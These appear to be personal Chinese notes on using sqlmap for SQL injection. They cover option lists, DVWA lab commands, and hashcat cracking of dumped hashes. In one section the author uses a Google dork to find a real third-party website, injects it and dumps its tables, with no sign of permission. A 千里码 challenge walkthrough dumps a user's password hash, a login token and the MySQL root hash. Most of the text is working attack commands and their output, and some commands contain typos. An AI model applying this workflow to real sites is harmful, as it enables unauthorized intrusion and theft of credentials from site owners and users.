<head><meta charset="UTF-8"></head>
## sqlmap功能说明
--cookie,
-u:目标URL，
-b：获取DBMS banner
--current-db：获取当前数据库
--current-user：获取当前用户
--users：枚举DBMS用户
--password：枚举DBMS用户密码hash
--dbs：获取数据库
-D：要枚举的DBMS数据库
-tables：枚举DBMS数据库中的数据表
-T：要枚举的DBMS数据库表
-columns：枚举DBMS数据库表中的所有列
-C：要枚举的DBMS数据表中的列
-dump：转储DBMS数据表项(以表格的形式显示出来)

 sqlmap -u "http://115.28.247.19/JDVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=vq9tofthrcegqi8c2etl2l54h0;security=low"
 sqlmap -u "http://!5.28.247.19/JDVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=vq9tofthrcegqi8c2etl2l54h0;security=low" --current-db --current-user --users --password --dbs -D mysql --tables -T user --column -C user.Password --dump

coder352yload  # 构造是所用的字符串
### HTTP 头部
请求的 HTTP
``` http
GET / HTTP/1.1
Connection: Keep-Alive
Keep-Alive: 300
Accept:*/*
Host: host
Accept-Language: en-us
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 ( .NET CLR 3.5.30729; .NET4.0E)
Cookie: guest_id=v1%3A1328019064; pid=v1%3A1328839311134
```

### 参数讲解
``` zsh
-hh              # 查看详细介绍, 这里将常用的列出来
-v Verbose       # verbose 等级, 1 default; 2 debug; 3 pyload; 4 请求头; 5 相应头; 6 相应页面
--flush-session  # Flush session files for current target
--purge-output   # Safely remove all content from output directory
prefix="python ~/github/others/sqlmap-dev/sqlmap.py -u 'http://115.28.247.19/JDVWA/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='PHPSESSID=5ns5hic217mg2oah4ih2lciao6;security=low'"
sqlmap -u "http://115.28.247.19/JDVWA/vulnerabilities/sqli/?id=1&Submit=Submit#"
  --cookie="PHPSESSID=5ns5hic217mg2oah4ih2lciao6;security=low" -v 4  # 直接扫描可以得到很多的漏洞
# 从后面开始都用 $prefix 代替前面好长的
$prefix -v 4  # zsh 不支持, 以后再弄
# 或者从 Burp 中导出文件 header.txt(Action -> Copy to File)
sqlmap -r header.txt
# 下面是以 DVWA Sql Injection Low 为例进行测试
# Target
-d             # 直接连接到数据库
-u "URL"       # 指定目标 URL
-r             # 从一个文件中载入 HTTP 请求
-g GoogleDork  # 处理 Google dork 结果为目标 URL
-c Config      # 从 ini 配置文件中加载选项
# Techniques
--technique=Tech  # BEUSTO
# Request
--referer=Referer  # 购物车
--headers=Headers  # 换行分开, 加入其它 HTTP 头
--auth-type=ATYPE  # HTTP 身份验证类型
--auth-cred=Acred  # HTTP 身份验证凭据, (用户名: 密码)
--auth-cert=Acert  # HTTP 认证证书 (key_file, cert_file)
--proxy=Proxy      # 使用 HTTP 代理连接到目标 URL
--data=Data
--cookie=Cookie     # 设置 Cookie 值
--cookie-urlencode  # URL 编码生成 Cookie 注入
--drop-set-cookie   # 忽略响应的 set-cookie 头信息
--user-agent=Agent  # 指定 User-Agent
--random-agent      # 使用随机的 User-Agent
$prefix --proxy=http://127.0.0.1:8080
# Enumerate 大写字母只是指定的作用, 不会输出, 通过前面的查询结果, 为后面的查询选择目标
-b              # 获取 DBMS banner
--current-db    # 获取当前数据库
--current-user  # 获取当前用户
--users         # 枚举 DBMS 用户
--password      # 枚举 DBMS 用户密码 hash, 可能破解出明文密码
--dbs           # 枚举 DBMS 中有多少数据库
-D DB           # 指定要枚举的 DBMS 数据库, 参数是通过上面的 --dbs 获得的, 为下面的 --tables 指定数据库, 不指定会列出所有的
--tables        # 枚举 DBMS 数据库中的数据表
-T TBL          # 指定要枚举的表, 参数是 --tables 获取的结果, 为下面的 --columns 指定数据表, 不指定会列出所有的
--columns       # 枚举 DBMS 数据库表中的所有列
-C COL          # 指定要枚举的 DBMS 数据表中的列
--dump          # 转储 DBMS 数据表项, 没有这一项, 上边的 -C 没有输出的, 按照 csv 格式保存在 ~/.sqlmap/output 目录下,并按照域名划分
$prefix -b --current-db --current-user  # 获取当前的 banner, db, user
  --users --password --dbs -D dvwa --talbes -T users --columns  -C user,password --dump  # DWVA 密码忘了可以用这个获取了...
```

### 开始实战
#### 一个外国的网站
``` zsh
Google: inurl:index.php?id=  # 还有很多其他的, 见 [乌云: 使用SQLMAP对网站和数据库进行SQL注入攻击.html]
http://www.icdcprague.org/index.php?id=10  # 找到这个(2005 年的老网站, 现在都 2016 了), 往 URL 后面加一个 '
http://www.icdcprague.org/index.php?id=10'  # 如果页面返回一个 MySQL 错误, 说明页面存在SQL注入点；如果页面加载正常显示或者重定向到一个不同的页面, 跳过这个网站, 用同样的方法去测试下一个网站吧'
sqlmap -u 'http://www.icdcprague.org/index.php?id=10' --dbms mysql --dbs  # 指定 MySQL, 因为从报错中已知了,这时候需要去告诉网站他们有漏洞了'
# 上边那一步跑了好长时间, sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
# 看到两个数据库, 其中的 information_schema 是几乎所有 MySQL 数据库默认的标准数据库, 所以我们的兴趣主要在 icdcprague 数据库上
sqlmap -u 'http://www.icdcprague.org/index.php?id=10' -D icdcprague --tables
[00:15:04] [INFO] fetching tables for database: 'icdcprague'
[00:15:06] [WARNING] reflective value(s) found and filtering out
[00:15:06] [INFO] the SQL query used returns 12 entries
[00:15:10] [INFO] retrieved: flags
[00:15:12] [INFO] retrieved: forma
[00:15:14] [INFO] retrieved: gallery
[00:15:17] [INFO] retrieved: news
[00:15:20] [INFO] retrieved: nobel
[00:15:23] [INFO] retrieved: nobel_es
[00:15:26] [INFO] retrieved: pages
[00:15:29] [INFO] retrieved: photos
[00:15:32] [INFO] retrieved: prison
[00:15:35] [INFO] retrieved: stat
[00:15:38] [INFO] retrieved: test
[00:15:42] [INFO] retrieved: tree
# 发现这个数据有8张表, 可惜没有 user 表, 没有目标了, 随便一个吧, prison
sqlmap -u 'http://www.icdcprague.org/index.php?id=10' -D icdcprague -T prison --columns
+-------------+------------------+
| Column      | Type             |
+-------------+------------------+
| active      | enum('n','y')    |
| author      | text             |
| id          | int(10) unsigned |
| insert_date | date             |
| lang        | enum('en','es')  |
| perex       | text             |
| photo1      | int(11)          |
| photo2      | int(11)          |
| photo3      | int(11)          |
| text        | mediumtext       |
| title       | text             |
+-------------+------------------+
sqlmap -u 'http://www.icdcprague.org/index.php?id=10' -D icdcprague -T prison -C author --dump  # 开始拖库, 可惜没有 user 表, 好多啊, 拖了 3min
# 假如我们得到了一个 hash加密 用户密码 24iYBc17xK0e.
hashid 24iYBc17xK0e.  # [+] DES(Unix), 这个排第一, 就应该是这个了
# NVDIA显卡, 使用cudaHashcat 笔记本是AMD显卡, 只能使用oclHashcat
# 如果你运行在VirtualBox或者VMWare上, 你既不能使用 cudahashcat 也不能使用 oclhashcat
cudahashcat -m 1500 -a 0 /root/sql/DES.hash /root/sql/rockyou.txt  # 将HASH值存储在DES.hash文件中, answer: abc123
```

#### 千里码 SQL注入-1
``` zsh
sqlmap -r burp.txt --technique B -p username --level 5  # 用 Burp 抓取请求头, 通过网页得知 username 和 boolean 注入, 直接上 level 5
# 有两个要填 y 的好变态的
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
# level 1 经测试不行, 不是很懂为什么, 按理说 boolean 的在 level 1 就行了
# 好像上边不应该用 boolean 来盲注, 下面查询 dbs tables columns 太慢了, 一个一个字母的蹦, 以后再也不用 Boolean 来拖库了
sqlmap -r burp.txt --dbs
[14:50:07] [INFO] fetching database names
[14:50:07] [INFO] fetching number of databases
[14:50:07] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[14:50:07] [INFO] retrieved: 5
[14:50:26] [INFO] retrieved: information_schema
[14:55:26] [INFO] retrieved: mysql
[14:57:00] [INFO] retrieved: performance_schema
[15:02:04] [INFO] retrieved: qlcoder
[15:04:12] [INFO] retrieved: test
available databases [5]:
[*] information_schema  # default
[*] mysql               # default
[*] performance_schema  # default
[*] qlcoder
[*] test
sqlmap -r burp.txt --dbs -D qlcoder --tables
[15:09:28] [INFO] retrieved: 13
[15:09:58] [INFO] retrieved: items
[15:11:49] [INFO] retrieved: items0
[15:12:38] [INFO] retrieved: items1
[15:13:28] [INFO] retrieved: items2
[15:14:22] [INFO] retrieved: items3
[15:15:14] [INFO] retrieved: items4
[15:16:06] [INFO] retrieved: items5
[15:16:58] [INFO] retrieved: items6
[15:17:52] [INFO] retrieved: items7
[15:18:46] [INFO] retrieved: items8
[15:19:36] [INFO] retrieved: items9
[15:20:26] [INFO] retrieved: tasks
[15:22:14] [INFO] retrieved: users
Database: qlcoder
[13 tables]
+--------+
| items  |
| items0 |
| items1 |
| items2 |
| items3 |
| items4 |
| items5 |
| items6 |
| items7 |
| items8 |
| items9 |
| tasks  |
| users  |
+--------+
sqlmap -r burp.txt --dbs -D qlcoder --tables -T users --columns
[15:28:39] [INFO] fetching columns for table 'users' in database 'qlcoder'
[15:28:39] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:28:39] [INFO] retrieved: 24
[15:29:05] [INFO] retrieved: id
[15:29:57] [INFO] retrieved: int(10) unsigned
[15:35:10] [INFO] retrieved: name
[15:36:44] [INFO] retrieved: varchar(255)
[15:40:32] [INFO] retrieved: password
[15:43:10] [INFO] retrieved: varchar(255)
[15:47:05] [INFO] retrieved: email
[15:48:53] [INFO] retrieved: varchar(255)
[15:52:50] [INFO] retrieved: created_at
[15:56:07] [INFO] retrieved: timestamp
[15:59:03] [INFO] retrieved: updated_at
[16:02:29] [INFO] retrieved: timestamp
[16:05:34] [INFO] retrieved: remember_token
[16:10:17] [INFO] retrieved: varchar(120)
[16:14:13] [INFO] retrieved: avatar_file_name
[16:19:31] [INFO] retrieved: varchar(255)
[16:23:31] [INFO] retrieved: avatar_file_size
[16:28:43] [INFO] retrieved: int(11)
[16:31:11] [INFO] retrieved: avatar_content_type
[16:37:03] [INFO] retrieved: varchar(255)
[16:41:01] [INFO] retrieved: avatar_updated_at
[16:46:19] [INFO] retrieved: timestamp
[16:49:25] [INFO] retrieved: company
[16:51:49] [INFO] retrieved: varchar(255)
[16:55:46] [INFO] retrieved: title
[16:57:35] [INFO] retrieved: varchar(255)
[17:01:35] [INFO] retrieved: location
[17:04:34] [INFO] retrieved: varchar(255)
[17:08:47] [INFO] retrieved: score
[17:10:44] [INFO] retrieved: int(11)
[17:13:38] [INFO] retrieved: solveNum
[17:16:35] [INFO] retrieved: int(11)
[17:19:09] [INFO] retrieved: msgcnt
[17:21:20] [INFO] retrieved: int(11)
[17:23:59] [INFO] retrieved: rank
[17:25:36] [INFO] retrieved: int(11)
[17:28:28] [INFO] retrieved: utm
[17:29:59] [INFO] retrieved: varchar(64)
[17:34:52] [INFO] retrieved: active
[17:37:25] [INFO] retrieved: int(11)
[17:40:09] [INFO] retrieved: step
[17:41:57] [INFO] retrieved: int(10)
[17:44:32] [INFO] retrieved: last_login_time
[17:50:36] [INFO] retrieved: int(11)
[17:53:38] [INFO] retrieved: introduce
[17:57:15] [INFO] retrieved: varchar(255)
[18:01:36] [INFO] retrieved: permission
[18:05:14] [INFO] retrieved: smallint(6)
Database: qlcoder
Table: users
[24 columns]
+---------------------+------------------+
| Column              | Type             |
+---------------------+------------------+
| active              | int(11)          |
| avatar_content_type | varchar(255)     |
| avatar_file_name    | varchar(255)     |
| avatar_file_size    | int(11)          |
| avatar_updated_at   | timestamp        |
| company             | varchar(255)     |
| created_at          | timestamp        |
| email               | varchar(255)     |
| id                  | int(10) unsigned |
| introduce           | varchar(255)     |
| last_login_time     | int(11)          |
| location            | varchar(255)     |
| msgcnt              | int(11)          |
| name                | varchar(255)     |
| password            | varchar(255)     |
| permission          | smallint(6)      |
| rank                | int(11)          |
| remember_token      | varchar(120)     |
| score               | int(11)          |
| solveNum            | int(11)          |
| step                | int(10)          |
| title               | varchar(255)     |
| updated_at          | timestamp        |
| utm                 | varchar(64)      |
+---------------------+------------------+
# 看到这里, 好像要把第二题做出来了, 解密好难啊
sqlmap -r burp.txt --dbs -D qlcoder -T users -C name,password --dump --threads 4
[18:20:41] [INFO] fetching entries of column(s) 'name, password' for table 'users' in database 'qlcoder'
[18:20:41] [INFO] fetching number of column(s) 'name, password' entries for table 'users' in database 'qlcoder'
[18:20:41] [INFO] retrieved: 1
[18:20:56] [INFO] retrieving the length of query output
[18:20:56] [INFO] retrieved: 7
[18:21:55] [INFO] retrieved: shinian
[18:21:55] [INFO] retrieving the length of query output
[18:21:55] [INFO] retrieved: 60
[18:27:12] [INFO] retrieved: $2y$10$W3K9aRuqAtShztY.4iEyj..qZuSKJL.3Njo.pmdHPzYOY5b2NHjnW
[18:27:12] [INFO] analyzing table dump for possible password hashes
Database: qlcoder
Table: users
[1 entry]
+---------+--------------------------------------------------------------+
| name    | password                                                     |
+---------+--------------------------------------------------------------+
| shinian | $2y$10$w3k9aruqatshzty.4ieyj..qzuskjl.3njo.pmdhpzyoy5b2nhjnw |
+---------+--------------------------------------------------------------+
sqlmap -r burp.txt --dbs -D qlcoder -T users -C remember_token --dump --threads 4
[21:28:36] [INFO] fetching entries of column(s) 'remember_token' for table 'users' in database 'qlcoder'
[21:28:36] [INFO] fetching number of column(s) 'remember_token' entries for table 'users' in database 'qlcoder'
[21:28:36] [INFO] resumed: 1
[21:28:36] [INFO] retrieving the length of query output
[21:28:36] [INFO] retrieved: 60
[21:35:12] [INFO] retrieved: BoAt2fMZhvMul5FLZwVhLOYqWufEPNsJ31EtCWNOYkSSghoPLudu9HrW7o9v
[21:35:12] [INFO] analyzing table dump for possible password hashes
Database: qlcoder
Table: users
[1 entry]
+--------------------------------------------------------------+
| remember_token                                               |
+--------------------------------------------------------------+
| BoAt2fMZhvMul5FLZwVhLOYqWufEPNsJ31EtCWNOYkSSghoPLudu9HrW7o9v |
+--------------------------------------------------------------+
sqlmap -r burp.txt --current-user  # 顺便破解一下系统的密码
[19:14:06] [INFO] retrieved: root@10.61.13.172
current user:    'root@10.61.13.172'
sqlmap -r burp.txt -U root@10.61.13.172 --passwords --threads 4
[19:26:30] [INFO] fetching number of password hashes for user 'root'
[19:26:30] [INFO] retrieved: 1
[19:26:46] [INFO] fetching password hashes for user 'root'
[19:26:46] [INFO] retrieving the length of query output
[19:26:46] [INFO] retrieved: 41
[19:32:48] [INFO] retrieved: *83D843BD76F65BD232E7A3F9B33DAB1179AD67C6
```

